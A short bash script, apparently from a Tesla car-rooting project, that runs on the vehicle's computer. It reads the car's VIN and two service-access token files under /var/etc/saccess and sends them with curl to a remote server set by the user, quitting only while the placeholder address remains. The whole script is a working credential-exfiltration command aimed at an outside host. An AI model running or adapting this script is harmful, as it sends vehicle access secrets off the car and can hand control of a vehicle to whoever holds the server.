#!/bin/bash

# Save https://github.com/Lunars/tesla/blob/master/src/save-tokens.php to your public server

yourSite="http://google.com"

if [ "$yourSite" == "http://google.com" ]; then
  echo "Script not yet setup, quitting"
  exit 1
fi

curl -m 10 $yourSite'/save-tokens.php?car='$(</var/etc/vin)'&s1='$(</var/etc/saccess/tesla1)'&s2='$(</var/etc/saccess/tesla2) >/dev/null 2>&1
